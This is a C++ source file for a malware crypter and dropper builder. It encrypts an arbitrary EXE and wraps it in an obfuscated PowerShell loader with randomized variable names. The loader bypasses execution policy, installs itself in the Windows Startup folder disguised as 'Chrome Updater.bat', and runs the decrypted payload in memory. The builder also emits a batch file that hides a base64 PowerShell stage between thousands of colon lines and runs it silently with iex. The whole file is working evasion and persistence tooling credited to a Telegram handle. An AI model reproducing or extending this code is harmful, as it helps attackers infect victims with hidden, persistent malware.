#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <unordered_map>

#pragma warning(disable : 4996)

// Base64 encoding
std::string base64_encode(const std::string& data) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    size_t i = 0;
    while (i < data.size()) {
        unsigned int octet_a = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int octet_b = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int octet_c = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        result += base64_chars[(triple >> 18) & 63];
        result += base64_chars[(triple >> 12) & 63];
        result += i > data.size() + 1 ? '=' : base64_chars[(triple >> 6) & 63];
        result += i > data.size() ? '=' : base64_chars[triple & 63];
    }
    return result;
}

// Random string generator
std::string generate_random_var_name(size_t length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::string name;
    for (size_t i = 0; i < length; ++i) {
        name += chars[rand() % chars.length()];
    }
    return name;
}

// Replace all occurrences in string
void replace_all(std::string& str, const std::string& from, const std::string& to) {
    size_t pos = 0;
    while ((pos = str.find(from, pos)) != std::string::npos) {
        str.replace(pos, from.length(), to);
        pos += to.length();
    }
}

// File I/O
std::vector<unsigned char> read_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot open input file");
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

void write_file(const std::string& filename, const std::string& content) {
    std::ofstream file(filename);
    if (!file) throw std::runtime_error("Cannot write output file: " + filename);
    file << content;
}

// Key generation
std::string generate_random_key(size_t length) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
    std::string key;
    for (size_t i = 0; i < length; ++i) {
        key += chars[rand() % chars.length()];
    }
    return key;
}

// Key derivation
std::vector<unsigned char> derive_key(const std::string& base_key, int length) {
    std::vector<unsigned char> key(length);
    for (int i = 0; i < length; ++i) {
        unsigned char val = base_key[i % base_key.length()];
        for (int j = 0; j < 5; ++j) {
            val = (val * 31 + base_key[(i + j) % base_key.length()]) & 0xFF;
        }
        key[i] = val;
    }
    return key;
}

// XOR encryption with shuffling
std::vector<unsigned char> encrypt_data(const std::vector<unsigned char>& data, const std::string& base_key) {
    std::vector<unsigned char> result = data;
    std::vector<unsigned char> key1 = derive_key(base_key, data.size());
    std::vector<unsigned char> key2 = derive_key(base_key + "salt", data.size());

    for (size_t i = 0; i < result.size(); ++i)
        result[i] ^= key1[i];

    for (size_t i = 0; i < result.size() - 1; i += 2)
        if (key1[i] % 2 == 0) std::swap(result[i], result[i + 1]);

    for (size_t i = 0; i < result.size(); ++i)
        result[i] ^= key2[i];

    return result;
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)) + GetTickCount());

    try {
        std::string exe_path;
        std::cout << "Enter path to EXE file - fedx988: ";
        std::getline(std::cin, exe_path);

        std::string base_key = generate_random_key(16);
        std::cout << "Generated random key: " << base_key << "\n";

        std::vector<unsigned char> exe_data = read_file(exe_path);
        std::vector<unsigned char> encrypted_data = encrypt_data(exe_data, base_key);
        std::string encrypted_base64 = base64_encode(std::string(encrypted_data.begin(), encrypted_data.end()));

        std::unordered_map<std::string, std::string> ps_vars = {
            {"policy", generate_random_var_name(8)},
            {"baseKey", generate_random_var_name(8)},
            {"key1", generate_random_var_name(8)},
            {"key2", generate_random_var_name(8)},
            {"encrypted", generate_random_var_name(8)},
            {"decrypted", generate_random_var_name(8)},
            {"assembly", generate_random_var_name(8)},
            {"entryPoint", generate_random_var_name(8)},
            {"Derive-Key", generate_random_var_name(10)},
            {"startupPath", generate_random_var_name(8)},
            {"currentPath", generate_random_var_name(8)}
        };

        std::string inner_ps1_script =
            "$policy = Get-ExecutionPolicy;"
            "if ($policy -eq 'Restricted' -or $policy -eq 'AllSigned') {"
            "    Start-Process powershell -ArgumentList \"-ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $env:currentBatPath -Raw))))\" -NoNewWindow;"
            "    exit;"
            "}"
            "$startupPath = [Environment]::GetFolderPath('Startup') + '\\Chrome Updater.bat';"
            "$currentPath = $env:currentBatPath;"
            "Copy-Item -Path $currentPath -Destination $startupPath -Force;" // Always copy with -Force
            "function Derive-Key($baseKey, $length) {"
            "    $key = New-Object Byte[] $length;"
            "    for ($i = 0; $i -lt $length; $i++) {"
            "        $val = [byte][char]$baseKey[$i % $baseKey.Length];"
            "        for ($j = 0; $j -lt 5; $j++) {"
            "            $val = ($val * 31 + [byte][char]$baseKey[($i + $j) % $baseKey.Length]) -band 0xFF;"
            "        }"
            "        $key[$i] = $val;"
            "    }"
            "    return $key;"
            "}"
            "$encrypted = [System.Convert]::FromBase64String(\"" + encrypted_base64 + "\");"
            "$baseKey = \"" + base_key + "\";"
            "$key1 = Derive-Key $baseKey $encrypted.Length;"
            "$key2 = Derive-Key ($baseKey + \"salt\") $encrypted.Length;"
            "$decrypted = New-Object Byte[] $encrypted.Length;"
            "for ($i = 0; $i -lt $encrypted.Length; $i++) {"
            "    $decrypted[$i] = $encrypted[$i] -bxor $key2[$i];"
            "}"
            "for ($i = $decrypted.Length - 1; $i -gt 0; $i -= 2) {"
            "    if ($key1[$i - 1] % 2 -eq 0) {"
            "        $temp = $decrypted[$i];"
            "        $decrypted[$i] = $decrypted[$i - 1];"
            "        $decrypted[$i - 1] = $temp;"
            "    }"
            "}"
            "for ($i = 0; $i -lt $decrypted.Length; $i++) {"
            "    $decrypted[$i] = $decrypted[$i] -bxor $key1[$i];"
            "}"
            "$assembly = [System.Reflection.Assembly]::Load($decrypted);"
            "$entryPoint = $assembly.EntryPoint;"
            "$entryPoint.Invoke($null, $null);";

        // Apply variable obfuscation
        for (const auto& [original, obf] : ps_vars) {
            if (original == "Derive-Key") {
                replace_all(inner_ps1_script, "function Derive-Key", "function " + obf);
                replace_all(inner_ps1_script, "Derive-Key", obf);
            }
            else {
                replace_all(inner_ps1_script, "$" + original, "$" + obf);
            }
        }

        // Write the obfuscated PowerShell script to output.ps1
        write_file("fedx.ps1", inner_ps1_script);

        // Encode the script for the .bat file
        std::string ps_base64 = base64_encode(inner_ps1_script);

        // Generate a massive block of colons
        std::string colon_block;
        const int num_lines = 750;
        const int colons_per_line = 200;
        for (int i = 0; i < num_lines; ++i) {
            colon_block += std::string(colons_per_line, ':') + "\n";
        }

        // BAT template with headless execution
        std::string bat_template =
            colon_block +
            "@echo off\n"
            "setlocal\n"
            "\n"
            "set \"currentBatPath=%~f0\"\n"
            "start /b powershell -exec bypass -C \"[Environment]::SetEnvironmentVariable('GBSKABG', $env:GBSKABG); iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content '%~f0' -raw | Select-String (':' + ':GNAHS::(.*)')).Matches.Groups[1].Value)))\" >nul 2>&1\n"
            "\n"
            "::GNAHS::" + ps_base64 + "\n"
            "\n"
            "endlocal\n"
            "exit /b\n" +
            colon_block;

        // Write the batch file
        write_file("fedx.bat", bat_template);
        std::cout << "Generated the most shittiest fedx.bat and fedx.ps1 with embedded PowerShell payload, forced startup persistence. - fedx988 on tele\n";

    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}